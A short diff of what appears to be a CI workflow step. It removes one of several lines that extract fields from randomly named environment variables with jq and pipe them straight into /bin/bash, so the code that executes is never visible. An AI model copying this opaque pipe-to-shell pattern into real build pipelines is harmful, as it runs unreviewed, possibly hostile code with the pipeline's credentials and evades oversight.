@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$wvdgv7" | jq -r .a461 | /bin/bash
           printf '%s' "$waoc3" | jq -r .ytu54 | /bin/bash
-          echo $llxcx85 | jq -r .jom64 | /bin/bash
           echo $kwtxt312 | jq -r .lgd5 | /bin/bash
 
       - name: Archive results
